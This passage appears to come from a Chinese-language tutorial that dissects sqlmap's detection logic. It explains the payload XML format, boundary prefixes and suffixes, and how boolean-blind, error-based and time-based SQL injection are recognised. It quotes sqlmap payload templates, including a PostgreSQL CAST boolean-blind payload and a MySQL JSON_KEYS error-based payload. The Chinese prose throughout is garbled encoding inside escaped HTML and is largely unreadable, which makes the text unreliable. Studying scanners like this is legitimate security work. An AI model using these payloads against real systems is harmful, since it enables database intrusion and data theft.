    tested as soon as it has been identified whether or not the
    injection is within a WHERE clause condition.
â€‹
    Valid values:
        0: Always
        1: WHERE / HAVING
        2: GROUP BY
        3: ORDER BY
        4: LIMIT
        5: OFFSET
        6: TOP
        7: Table name
        8: Column name
        9: Pre-WHERE (non-query)
â€‹
    A comma separated list of these values is also possible.&lt;/code&gt;&lt;p&gt;åœ¨ä¸Šé¢å‡ ä¸ªå­æ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸è§çš„å°±æ˜¯ &lt;code class=&quot;inline&quot;&gt;level/risk&lt;/code&gt; ä¸€èˆ¬æ¥è¯´ï¼Œé»˜è®¤çš„ sqlmap é…ç½®è·‘ä¸å‡ºæ¼æ´çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šå¯åŠ¨æ›´é«˜çº§åˆ« &lt;code class=&quot;inline&quot;&gt;(level=5/risk=3)&lt;/code&gt; çš„é…ç½®é¡¹æ¥å¯åŠ¨æ›´å¤šçš„ payloadã€‚&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬å†åˆ†æä¸‹é¢çš„æ ‡ç­¾&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;where&amp;gt;
    Where to add our &#39;&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&#39; string.
â€‹
    Valid values:
        1: Append the string to the parameter original value
        2: Replace the parameter original value with a negative random
            integer value and append our string
        3: Replace the parameter original value with our string
â€‹
Sub-tag: &amp;lt;vector&amp;gt;
    The payload that will be used to exploit the injection point.
    è¿™ä¸ªæ ‡ç­¾åªæ˜¯å¤§è‡´è¯´æ˜ Payload é•¿ä»€ä¹ˆæ ·å­ï¼Œå…¶å®å®é™…è¯·æ±‚çš„ Payload æˆ–è€…å˜å½¢ä¹‹å‰çš„ Payload å¯èƒ½å¹¶ä¸æ˜¯è¿™ä¸ª Payloadï¼Œä»¥ request å­æ ‡ç­¾ä¸­çš„ payload ä¸ºå‡†ã€‚
â€‹
Sub-tag: &amp;lt;request&amp;gt; 
    What to inject for this test.
    å…³äºå‘èµ·è¯·æ±‚çš„è®¾ç½®ä¸é…ç½®ã€‚åœ¨è¿™äº›é…ç½®ä¸­ï¼Œæœ‰ä¸€äº›æ˜¯ç‰¹æœ‰çš„ï¼Œä½†æ˜¯æœ‰ä¸€äº›æ˜¯å¿…é¡»çš„ï¼Œä¾‹å¦‚ payload æ˜¯è‚¯å®šå­˜åœ¨çš„ï¼Œä½†æ˜¯ comment æ˜¯ä¸ä¸€å®šæœ‰çš„ï¼Œchar å’Œ columns æ˜¯åªæœ‰ UNION æ‰å­˜åœ¨
â€‹
    Sub-tag: &amp;lt;payload&amp;gt;
        The payload to test for. å®é™…æµ‹è¯•ä½¿ç”¨çš„ Payload
â€‹
    Sub-tag: &amp;lt;comment&amp;gt;
        Comment to append to the payload, before the suffix.
â€‹
    Sub-tag: &amp;lt;char&amp;gt; åªæœ‰ UNION æ³¨å…¥å­˜åœ¨çš„å­—æ®µ
        Character to use to bruteforce number of columns in UNION
        query SQL injection tests.
â€‹
    Sub-tag: &amp;lt;columns&amp;gt; åªæœ‰ UNION æ³¨å…¥å­˜åœ¨çš„å­—æ®µ
        Range of columns to test for in UNION query SQL injection
        tests.
â€‹
Sub-tag: &amp;lt;response&amp;gt;
    How to identify if the injected payload succeeded.
    ç”±äº payload çš„ç›®çš„ä¸ä¸€å®šæ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ï¼Œå®é™…ä¸Šå¤„ç†è¯·æ±‚çš„æ–¹æ³•ä¹Ÿå¹¶ä¸æ˜¯ç›¸åŒçš„ï¼Œå…·ä½“çš„å¤„ç†æ–¹æ³•æ­¥éª¤ï¼Œåœ¨æˆ‘ä»¬åç»­çš„ç« èŠ‚ä¸­æœ‰è¯¦ç»†çš„åˆ†æã€‚
â€‹
    Sub-tag: &amp;lt;comparison&amp;gt; 
        é’ˆå¯¹å¸ƒå°”ç›²æ³¨çš„ç‰¹æœ‰å­—æ®µï¼Œè¡¨ç¤ºå¯¹æ¯”å’Œ request ä¸­è¯·æ±‚çš„ç»“æœã€‚
        Perform a request with this string as the payload and compare
        the response with the &amp;lt;payload&amp;gt; response. Apply the comparison
        algorithm.
â€‹
        NOTE: useful to test for boolean-based blind SQL injections.
â€‹
    Sub-tag: &amp;lt;grep&amp;gt; 
        é’ˆå¯¹æŠ¥é”™å‹æ³¨å…¥çš„ç‰¹æœ‰å­—æ®µï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å»åŒ¹é…ç»“æœã€‚
        Regular expression to grep for in the response body.
â€‹
        NOTE: useful to test for error-based SQL injection.
â€‹
    Sub-tag: &amp;lt;time&amp;gt;
        é’ˆå¯¹æ—¶é—´ç›²æ³¨
        Time in seconds to wait before the response is returned.
â€‹
        NOTE: useful to test for time-based blind and stacked queries
        SQL injections.
â€‹
    Sub-tag: &amp;lt;union&amp;gt;
        å¤„ç† UNION â€¢æ³¨å…¥çš„åŠæ³•ã€‚
        Calls unionTest() function.
â€‹
        NOTE: useful to test for UNION query (inband) SQL injection.
â€‹
Sub-tag: &amp;lt;details&amp;gt;
    Which details can be infered if the payload succeed.
    å¦‚æœ response æ ‡ç­¾ä¸­çš„æ£€æµ‹ç»“æœæˆåŠŸäº†ï¼Œå¯ä»¥æ¨æ–­å‡ºä»€ä¹ˆç»“è®ºï¼Ÿ
â€‹
    Sub-tags: &amp;lt;dbms&amp;gt;
        What is the database management system (e.g. MySQL).
â€‹
    Sub-tags: &amp;lt;dbms_version&amp;gt;
        What is the database management system version (e.g. 5.0.51).
â€‹
    Sub-tags: &amp;lt;os&amp;gt;
        What is the database management system underlying operating
        system.&lt;/code&gt;&lt;p&gt;åœ¨åˆæ­¥äº†è§£äº†åŸºæœ¬çš„ Payload æµ‹è¯•æ•°æ®æ¨¡å‹ä¹‹åï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¿›è¡Œè¯¦ç»†çš„æ£€æµ‹é€»è¾‘çš„ç»†èŠ‚åˆ†æï¼Œå› ä¸ºç¯‡å¹…çš„åŸå› ï¼Œæˆ‘ä»¬æš‚ä¸”åªé’ˆå¯¹å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨è¿›è¡Œåˆ†æï¼Œ&lt;/p&gt;&lt;h2&gt;&lt;b&gt;çœŸæ­£çš„ Payload&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬åœ¨å‰é¢çš„ä»‹ç»ä¸­å‘ç°äº†å‡ ä¸ªç–‘ä¼¼ Payload çš„å­—æ®µï¼Œä½†æ˜¯é—æ†¾çš„æ˜¯ï¼Œä¸Šé¢çš„æ¯ä¸€ä¸ª Payload éƒ½ä¸æ˜¯çœŸæ­£çš„ Payloadã€‚å®é™… sqlmap åœ¨å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œåªè¦æ˜¯ä» &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; ä¸­åŠ è½½çš„ Payloadï¼Œéƒ½æ˜¯éœ€è¦ç»è¿‡ä¸€äº›éšæœºåŒ–å’Œé¢„å¤„ç†ï¼Œè¿™äº›é¢„å¤„ç†æ¶‰åŠåˆ°çš„æ¦‚å¿µå¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;ï¼šéœ€è¦ä¸ºåŸå§‹ Payload çš„å‰åæ·»åŠ â€œè¾¹ç•Œâ€ã€‚è¾¹ç•Œæ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿ï¼Œä¸»è¦å–å†³äºå½“å‰â€œæ‹¼æ¥â€çš„ SQL è¯­å¥çš„ä¸Šä¸‹æ–‡ï¼Œå¸¸è§ä¸Šä¸‹æ–‡ï¼šæ³¨å…¥ä½ç½®æ˜¯ä¸€ä¸ªâ€œæ•´å½¢â€ï¼›æ³¨å…¥ä½ç½®éœ€è¦å•å¼•å·/åŒå¼•å·&lt;code class=&quot;inline&quot;&gt;(&#39;/&quot;)&lt;/code&gt;é—­åˆè¾¹ç•Œï¼›æ³¨å…¥ä½ç½®åœ¨ä¸€ä¸ªæ‹¬å·è¯­å¥ä¸­ã€‚&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;--tamper&lt;/code&gt;ï¼šTamper æ˜¯ sqlmap ä¸­æœ€é‡è¦çš„æ¦‚å¿µä¹‹ä¸€ï¼Œä¹Ÿæ˜¯ Bypass å„ç§é˜²ç«å¢™çš„æœ‰åŠ›çš„æ­¦å™¨ã€‚åœ¨ sqlmap ä¸­ï¼ŒTamper çš„å¤„ç†ä½äºæˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ &lt;code class=&quot;inline&quot;&gt;agent.queryPage()&lt;/code&gt; ä¸­ï¼Œå…·ä½“ä½äºå…¶å¯¹ Payload çš„å¤„ç†ã€‚&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;&quot;Render&quot;&lt;/code&gt;ï¼šå½“ç„¶è¿™ä¸€ä¸ªæ­¥éª¤åœ¨ sqlmap ä¸­æ²¡æœ‰æ˜æ˜¾çš„æ¦‚å¿µè¿›è¡Œå¯¹åº”ï¼Œå…¶ä¸»è¦æ˜¯é’ˆå¯¹ Payload ä¸­éšæœºåŒ–çš„æ ‡ç­¾è¿›è¡Œæ¸²æŸ“å’Œæ›¿æ¢ï¼Œä¾‹å¦‚ï¼š&lt;br&gt;&lt;br&gt;[INFERENCE] è¿™ä¸ªæ ‡ç­¾é€šå¸¸è¢«æ›¿æ¢æˆä¸€ä¸ªç­‰å¼ï¼Œè¿™ä¸ªç­‰å¼ç”¨äºåˆ¤æ–­ç»“æœçš„æ­£è´Ÿ`Positive/Negative`&lt;br&gt;[RANDSTR] ä¼šè¢«æ›¿æ¢æˆéšæœºå­—ç¬¦ä¸²&lt;br&gt;[RANDNUM] ä¸ [RANDNUMn] â€¢ä¼šè¢«æ›¿æ¢æˆä¸åŒçš„æ•°å­—&lt;br&gt;[SLEEPTIME] åœ¨æ—¶é—´ç›²æ³¨ä¸­ä¼šè¢«æ›¿æ¢ä¸º SLEEP çš„æ—¶é—´&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;æ‰€ä»¥ï¼Œå®é™…ä¸Šä» &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; ä¸­åŠ è½½å‡ºæ¥çš„ Payload éœ€è¦ç»è¿‡ä¸Šé¢çš„å¤„ç†æ‰èƒ½çœŸçš„ç®—æ˜¯å¤„ç†å®Œæˆã€‚è¿™ä¸ª Payload æ‰ä¼šåœ¨ &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; çš„æ—¥å¿—ä¸­è¾“å‡ºå‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ &lt;code class=&quot;inline&quot;&gt;sqlmap -v3&lt;/code&gt; é€‰é¡¹çœ‹åˆ°çš„æœ€ç»ˆ Payloadã€‚&lt;/p&gt;&lt;p&gt;åœ¨ä¸Šé¢çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬åˆæåˆ°äº†ä¸€ä¸ªé™Œç”Ÿçš„æ¦‚å¿µï¼Œ&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;ï¼Œå¹¶ä¸”åšäº†ç›¸å¯¹ç®€å•çš„ä»‹ç»ï¼Œå…·ä½“çš„ &lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;ï¼Œæˆ‘ä»¬åœ¨ &lt;code class=&quot;inline&quot;&gt;{sqlmap_dir}/xml/boundaries.xml&lt;/code&gt; ä¸­å¯ä»¥æ‰¾åˆ°ï¼š&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;boundary&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt; 
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;ptype&amp;gt;&amp;lt;/ptype&amp;gt;
    &amp;lt;prefix&amp;gt;&amp;lt;/prefix&amp;gt;
    &amp;lt;suffix&amp;gt;&amp;lt;/suffix&amp;gt;
&amp;lt;/boundary&amp;gt;&lt;/code&gt;&lt;p&gt;åœ¨å…·ä½“çš„å®šä¹‰ä¸­ï¼Œæˆ‘ä»¬å‘ç°æ²¡è§è¿‡çš„å­æ ‡ç­¾å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    Sub-tag: &amp;lt;ptype&amp;gt;
        What is the parameter value type. å‚æ•°â€¢ç±»å‹ï¼ˆå‚æ•°è¾¹ç•Œä¸Šä¸‹æ–‡ç±»å‹ï¼‰
â€‹
        Valid values:
            1: Unescaped numeric
            2: Single quoted string
            3: LIKE single quoted string
            4: Double quoted string
            5: LIKE double quoted string
â€‹
    Sub-tag: &amp;lt;prefix&amp;gt;
        A string to prepend to the payload.
â€‹
    Sub-tag: &amp;lt;suffix&amp;gt;
        A string to append to the payload.&lt;/code&gt;&lt;p&gt;å…¶å®åˆ°ç°åœ¨ sqlmap ä¸­ Payload çš„ç»“æ„æˆ‘ä»¬å°±éå¸¸æ¸…æ¥šäº†&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt;&lt;p&gt;å…¶ä¸­ &lt;code class=&quot;inline&quot;&gt;&amp;lt;prefix&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt; æ¥æºäº &lt;code class=&quot;inline&quot;&gt;boundaries.xml&lt;/code&gt; ä¸­ï¼Œè€Œ &lt;code class=&quot;inline&quot;&gt;&amp;lt;payload&amp;gt; &amp;lt;comment&amp;gt;&lt;/code&gt; æ¥æºäºæœ¬èº« &lt;code class=&quot;inline&quot;&gt;xml/payloads/*.xml&lt;/code&gt; ä¸­çš„ &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; ä¸­ã€‚åœ¨æœ¬èŠ‚ä¸­éƒ½æœ‰éå¸¸è¯¦ç»†çš„æè¿°äº†&lt;/p&gt;&lt;h2&gt;&lt;b&gt;é’ˆå¯¹å¸ƒå°”ç›²æ³¨çš„æ£€æµ‹&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨æ¥ä¸‹æ¥çš„å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šé’ˆå¯¹å‡ ç§æ³¨å…¥è¿›è¡Œè¯¦ç»†åˆ†æï¼Œæˆ‘ä»¬çš„åˆ†æä¾æ®ä¸»è¦æ˜¯ sqlmap è®¾å®šçš„ Payload çš„æ•°æ®æ¨¡å‹å’Œå…¶æœ¬èº«çš„ä»£ç ã€‚æœ¬èŠ‚å…ˆé’ˆå¯¹å¸ƒå°”ç›²æ³¨è¿›è¡Œä¸€äº›è¯¦ç»†åˆ†æã€‚&lt;/p&gt;&lt;p&gt;åœ¨åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªè¯¦ç»†çš„ Payload:&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;1&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;3&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;3&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;2&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/comparison&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;PostgreSQL&amp;lt;/dbms&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;æ ¹æ®ä¸Šä¸€èŠ‚ä»‹ç»çš„å­æ ‡ç­¾çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´è§‚å¯Ÿè¿™ä¸ª &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; ä¼šè‡³å°‘å‘é€ä¸¤ä¸ª Payloadï¼šç¬¬ä¸€ä¸ªä¸º &lt;code class=&quot;inline&quot;&gt;request&lt;/code&gt; æ ‡ç­¾ä¸­çš„ &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; ç¬¬äºŒä¸ªä¸º &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; æ ‡ç­¾ä¸­çš„ &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; ä¸­çš„ Payloadã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œé’ˆå¯¹å¸ƒå°”ç›²æ³¨çš„æ£€æµ‹å®é™…ä¸Šåªéœ€è¦æ£€æµ‹ &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; å’Œ &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; è¿™ä¸¤ä¸ªè¯·æ±‚ï¼Œåªè¦è¿™ä¸¤ä¸ªè¯·æ±‚é¡µé¢ä¸ç›¸åŒï¼Œå°±å¯ä»¥åˆ¤å®šæ˜¯å­˜åœ¨é—®é¢˜çš„ã€‚å¯æ˜¯äº‹å®çœŸçš„å¦‚æ­¤å—ï¼Ÿç»“æœå½“ç„¶å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬é¦–å…ˆå®šä¹‰ &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; ä¸­çš„çš„è¯·æ±‚ä¸ºæ­£è¯·æ±‚ &lt;code class=&quot;inline&quot;&gt;Positive&lt;/code&gt;ï¼Œå¯¹åº” &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; ä¸­çš„è¯·æ±‚ä¸ºè´Ÿè¯·æ±‚ &lt;code class=&quot;inline&quot;&gt;Negative&lt;/code&gt;ï¼Œåœ¨ sqlmap ä¸­åŸå¤„ç†å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-889c61c0043a4bbae05fd30cecbbaac5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1478&quot; data-rawheight=&quot;762&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-889c61c0043a4bbae05fd30cecbbaac5&quot; data-watermark-src=&quot;v2-4264d6978637ad50c6159d8c55c8ca5d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;åœ¨ä»£ç æ‰¹æ³¨ä¸­æˆ‘ä»¬è¿›è¡Œè¯¦ç»†çš„è§£é‡Šï¼Œä¸ºäº†è®©å¤§å®¶çœ‹å¾—æ›´æ¸…æ¥šï¼Œæˆ‘ä»¬æŠŠä»£ç è½¬å˜ä¸ºæµç¨‹å›¾ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e395260b8da555410426a857d7211f9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;825&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e395260b8da555410426a857d7211f9&quot; data-watermark-src=&quot;v2-1cfc26e92a86a341a395d991fb6cc5f5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å…¶ä¸­æœ€å®¹æ˜“è¢«é—å¿˜çš„å¯èƒ½å¹¶ä¸æ˜¯æ­£è´Ÿè¯·æ±‚çš„å¯¹æ¯”ï¼Œè€Œæ˜¯æ­£è¯·æ±‚ä¸æ¨¡ç‰ˆé¡µé¢çš„å¯¹æ¯”ï¼Œè´Ÿè¯·æ±‚ä¸é”™è¯¯è¯·æ±‚çš„å¯¹æ¯”å’Œé”™è¯¯è¯·æ±‚ä¸æ¨¡ç‰ˆé¡µé¢çš„å¯¹æ¯”ï¼Œå› ä¸ºå¹¿æ³›å­˜åœ¨ä¸€ç§æƒ…å†µæ˜¯ç±»ä¼¼æ–‡ä»¶åŒ…å«æ¨¡å¼çš„æƒ…å†µï¼Œä¸åŒçš„åˆç†è¾“å…¥çš„ç»“æœæœ‰å¤§æ¦‚ç‡ä¸ç›¸åŒï¼Œä¸”æ¯ä¸€æ¬¡è¾“å…¥çš„ç»“æœå¦‚æœæŠ¥é”™éƒ½ä¼šè·³è½¬åˆ°æŸä¸€ä¸ªé»˜è®¤é¡µé¢ï¼ˆå­˜åœ¨é»˜è®¤å‚æ•°ï¼‰ï¼Œè¿™ç§æƒ…å†µä»…ä»…ç”¨æ­£è´Ÿè¯·æ±‚æ¥åŒºåˆ†é¡µé¢ä¸åŒæ˜¯å®Œå…¨ä¸å¤Ÿç”¨çš„ï¼Œè¿˜éœ€è¦å„ç§æƒ…å½¢ä¸æ¨¡ç‰ˆé¡µé¢çš„æ¯”è¾ƒæ¥ç¡®å®šã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;é’ˆå¯¹ GREP å‹ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é’ˆå¯¹æŠ¥é”™æ³¨å…¥å…¶å®éå¸¸å¥½è¯†åˆ«ï¼Œåœ¨æŠ¥é”™æ³¨å…¥æ£€æµ‹çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä»–çš„ &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; å­æ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç€æ˜¯ &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; å­æ ‡ç­¾ï¼š&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;MySQL &amp;amp;gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;2&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;5&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;1&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1,2,3,9&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;1&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY]),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;grep&amp;gt;[DELIMITER_START](?P&amp;amp;lt;result&amp;amp;gt;.*?)[DELIMITER_STOP]&amp;lt;/grep&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;MySQL&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;amp;gt;= 5.7.8&amp;lt;/dbms_version&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°å­æ ‡ç­¾ &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; ä¸­æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥ç›´æ¥ä»æ•´ä¸ªè¯·æ±‚ä¸­é€šè¿‡ grep ä¸­çš„æ­£åˆ™æå–å‡ºå¯¹åº”çš„å†…å®¹ï¼Œå¦‚æœæˆåŠŸæå–å‡ºäº†å¯¹åº”å†…å®¹ï¼Œåˆ™è¯´æ˜è¯¥å‚æ•°å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚&lt;/p&gt;&lt;p&gt;åœ¨å…·ä½“ä»£ç ä¸­ï¼Œå…¶å®éå¸¸ç›´è§‚å¯ä»¥çœ‹åˆ°ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbdc68e369293fa89fd0683922aa541b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-dbdc68e369293fa89fd0683922aa541b&quot; data-watermark-src=&quot;v2-b46b7662e0a4c22eb8b9979bfed695eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å† sqlmap çš„å®ç°ä¸­å…¶å®å¹¶ä¸æ˜¯ä»…ä»…æ£€æŸ¥é¡µé¢å†…å®¹å°±è¶³å¤Ÿçš„ï¼Œé™¤äº†é¡µé¢å†…å®¹ä¹‹å¤–ï¼Œæ£€æŸ¥å¦‚ä¸‹é¡¹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTP çš„é”™è¯¯é¡µé¢&lt;/li&gt;&lt;li&gt;Headers ä¸­çš„å†…å®¹&lt;/li&gt;&lt;li&gt;é‡å®šå‘ä¿¡æ¯&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;é’ˆå¯¹ TIME å‹ï¼ˆæ—¶é—´ç›²æ³¨ï¼ŒHeavilyQueryï¼‰&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“ç„¶æ—¶é—´ç›²æ³¨æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çŒœåˆ°åº”è¯¥æ€ä¹ˆå¤„ç†ï¼šå¦‚æœå‘å‡ºäº†è¯·æ±‚å¯¼è‡´å»¶è¿Ÿäº† X ç§’ï¼Œå¹¶ä¸”å“åº”å»¶è¿Ÿçš„æ—¶é—´æ˜¯æˆ‘ä»¬é¢„æœŸçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ¤å®šè¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ—¶é—´æ³¨å…¥ç‚¹ã€‚&lt;/p&gt;&lt;p&gt;ä½†æ˜¯ä»…ä»…æ˜¯è¿™æ ·å°±å¯ä»¥äº†å˜›ï¼Ÿå½“ç„¶æˆ‘ä»¬éœ€è¦äº†è§£çš„æ˜¯ sqlmap å¦‚ä½•è®¾ç½®è¿™ä¸ª X ä½œä¸ºæ—¶é—´ç‚¹ï¼ˆè¯·çœ‹ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼Œä½äº &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; ä¸­ï¼‰ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0291e85a6985aa5192c135f7356b8681_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1390&quot; data-rawheight=&quot;655&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0291e85a6985aa5192c135f7356b8681&quot; data-watermark-src=&quot;v2-22eec861df21fd6569007ffdf640ec21&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°ï¼Œå®ƒé‡Œé¢æœ‰ä¸€ä¸ªæ•°å­¦æ¦‚å¿µï¼š&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E5%B7%AE&quot;&gt;æ ‡å‡†å·®&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;ç®€å•æ¥è¯´ï¼Œæ ‡å‡†å·®æ˜¯ä¸€ç»„æ•°å€¼è‡ªå¹³å‡å€¼åˆ†æ•£å¼€æ¥çš„ç¨‹åº¦çš„ä¸€ç§æµ‹é‡è§‚å¿µã€‚ä¸€ä¸ªè¾ƒå¤§çš„æ ‡å‡†å·®ï¼Œä»£è¡¨å¤§éƒ¨åˆ†çš„æ•°å€¼å’Œå…¶å¹³å‡å€¼ä¹‹é—´å·®å¼‚è¾ƒå¤§ï¼›ä¸€ä¸ªè¾ƒå°çš„æ 